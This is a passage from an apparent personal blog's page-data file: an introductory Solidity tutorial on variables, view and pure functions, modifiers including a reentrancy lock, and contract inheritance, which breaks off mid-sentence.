{"componentChunkName":"component---src-templates-blog-post-js","path":"/solidity/","result":{"data":{"site":{"siteMetadata":{"title":"bwake blog"}},"markdownRemark":{"id":"96a35cf4-5689-5333-8514-842a18f59454","excerpt":"Solidity is a smart contract development language.\nIt is statically typed,supports inheritance, libraries etc. Solidity code is written in files with .sol…","html":"<p><strong>Solidity</strong> is a smart contract development language.\nIt is statically typed,supports inheritance, libraries etc.</p>\n<p>Solidity code is written in files with <strong>.sol</strong> extension. You can use remix browser editor here <a href=\"http://remix.ethereum.org\">Remix</a> .It allows you to compile and deploy your contracts on the go.</p>\n<p><strong>pragma</strong> declares the version of solidity compiler to use.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.5</span><span class=\"token number\">.3</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><strong>contracts</strong> are the building blocks of smart contracts.\nlets write our first contract</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Variables in solidity</h3>\n<p><strong>state variables</strong>  are written in the blockchain.They’re permanently stored in contract storage.</p>\n<p><strong>local variables(memory)</strong> − are variables whose values are present till function is executing.\n<strong>Calldata</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//state variable</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> num1 <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">myNumber</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _num2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//local variable</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> num2 <span class=\"token operator\">=</span> _num2<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>Strings</h4>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> greetings <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>I’ts expensive to use the ethereum blockchain as a data storage hence using strings in your contracts is discouraged.\nYou can store large amount of data records on <strong>IPFS</strong>. It’s cheaper and public.</p>\n<h4>Functions</h4>\n<p>Function are categorized according to <strong>visibility</strong> i.e <em>public, private, internal and external</em> and <strong>behavior</strong> i.e <em>payable</em>,<em>view</em> and <em>pure</em>.\nThere are functions that:</p>\n<ul>\n<li>\n<p><em>Create transactions on the blockchain</em>. They cost gas to call them.</p>\n<ul>\n<li>Statements that change the state of the blockchain:</li>\n<li>Writing to state variables.</li>\n<li>Emitting events</li>\n<li>Creating other contracts</li>\n<li>Using self-destruct</li>\n<li>Sending Ether via calls</li>\n<li>Calling any function bot marked as <strong>view</strong> or <strong>pure</strong>.</li>\n<li>Using low-level calls</li>\n<li>Using inline assembly that contains certain opcodes</li>\n</ul>\n</li>\n<li>\n<p><em>Functions that don’t create transactions on the blockchain</em>.  This can be called for free.</p>\n<ul>\n<li><strong>View</strong> functions doesn’t change the state of the blockchain</li>\n<li><strong>Pure</strong> functions does not change state nor read state variables in the blockchain.</li>\n<li>\n<p>Statement considered reading from the state.</p>\n<ul>\n<li>Reading from state variables.</li>\n<li>Accessing <em>address(this).balance</em> or <em>&#x3C; address >.balance</em>.</li>\n<li>Accessing any member of <em>block, tx, msg</em> except <em>msg.sig and msg.data</em></li>\n<li>Calling any function not marked pure.</li>\n<li>Using inline assembly that contains certain opcodes</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span> <span class=\"token punctuation\">{</span>\n         \n  <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> x <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n      name <span class=\"token operator\">=</span> _name<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token comment\">//View Functions</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> add <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> y<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token comment\">//Pure Functions</span>\n  <span class=\"token keyword\">function</span> addNum <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> y<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">returns</span> x <span class=\"token operator\">+</span> y<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>solidity functions can return multiple values</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">    <span class=\"token keyword\">function</span> <span class=\"token function\">returnMultipleValuesA</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">returnMultipleValuesB</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">//Destructing Assignments</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">destructuredAssignments</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> a<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span> b<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> c<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">returnMultipleValuesA</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//leaving values out</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<p>In <strong>public functions</strong> you cannot input:</p>\n<ul>\n<li>maps</li>\n<li>multi-dimensional arrays(unfixed size).</li>\n</ul>\n<h4>Function Modifiers</h4>\n<p>Functions modifiers are reusable code that can be attached to a function either before or after the function is executed.\nThey can be used to restrict write access, validate input and prevent reentrancy hack</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n \n <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n     owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n \n <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not Owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">modifier</span> <span class=\"token function\">validAddress</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_addr <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not valid address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n \n <span class=\"token keyword\">function</span> <span class=\"token function\">changeOwner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newOwner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token function\">validAddress</span><span class=\"token punctuation\">(</span>_newOwner<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     \n     owner <span class=\"token operator\">=</span> _newOwner<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n\n <span class=\"token comment\">//No reentrancy</span>\n <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> x <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n <span class=\"token builtin\">bool</span> locked<span class=\"token punctuation\">;</span>\n \n <span class=\"token keyword\">modifier</span> <span class=\"token function\">noReentrancy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>locked<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Locked\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     \n     locked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n     locked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span>\n \n <span class=\"token keyword\">function</span> <span class=\"token function\">decrement</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> noReentrancy <span class=\"token punctuation\">{</span>\n     x <span class=\"token operator\">-=</span> i<span class=\"token punctuation\">;</span>\n     \n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n         <span class=\"token function\">decrement</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">}</span>\n <span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Inheritance</h3>\n<p>You can inherit contracts in solidity.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">greet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld2</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">{</span>\n    \n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>You can override a function from the parent function.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">greet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld2</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">greet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello world\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>When you deploy contract <code class=\"language-text\">HelloWorld2</code> you’ll see it has the <code class=\"language-text\">greet()</code> method</p>\n<p>You can inherit constructor parameters</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n<span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> origin<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _origin<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    origin <span class=\"token operator\">=</span> _origin<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld2</span> <span class=\"token keyword\">is</span> HelloWorld <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _origin<span class=\"token punctuation\">)</span> <span class=\"token function\">HelloWorld</span><span class=\"token punctuation\">(</span>_origin<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n      \n  <span class=\"token punctuation\">}</span>  \n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>You can inherit from multiple contracts</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">hi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"Hi\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld2</span> <span class=\"token keyword\">is</span> HelloWorld <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">habari</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"Habari\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld3</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">,</span>HelloWorld2 <span class=\"token punctuation\">{</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Contracts are inherited from the most base like to the most derived.\nYou can call contracts <code class=\"language-text\">explicitly</code> or using <code class=\"language-text\">super</code> to get the parent method.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">event</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">hi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A greetings function was called from contract 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">habari</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"habari yako kutoka kwa kandarasi ya  ya pili\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld2</span> <span class=\"token keyword\">is</span> HelloWorld <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">hi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A greetings function was called from contract 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        HelloWorld<span class=\"token punctuation\">.</span><span class=\"token function\">hi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        super<span class=\"token punctuation\">.</span><span class=\"token function\">habari</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld3</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">,</span>HelloWorld2 <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">hi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A greetings function was called from contract 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        HelloWorld<span class=\"token punctuation\">.</span><span class=\"token function\">hi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld4</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">,</span>HelloWorld2<span class=\"token punctuation\">,</span> HelloWorld3 <span class=\"token punctuation\">{</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>You can inherit and call the constructor function in three ways:</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld</span><span class=\"token punctuation\">{</span>\n<span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    name <span class=\"token operator\">=</span> _name<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Greeting</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> text<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _text<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        text <span class=\"token operator\">=</span> _text<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld2</span> <span class=\"token keyword\">is</span> <span class=\"token function\">HelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A fixed name input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Greeting</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Another fixed text Input\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld3</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">,</span> Greeting <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token function\">HelloWorld</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hard code new input\"</span><span class=\"token punctuation\">)</span> <span class=\"token function\">Greeting</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hard code new greeting\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    \n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HelloWorld4</span> <span class=\"token keyword\">is</span> HelloWorld<span class=\"token punctuation\">,</span> Greeting <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">)</span> <span class=\"token function\">HelloWorld</span><span class=\"token punctuation\">(</span>_name<span class=\"token punctuation\">)</span> <span class=\"token function\">Greeting</span><span class=\"token punctuation\">(</span>_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    \n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>The order in which the 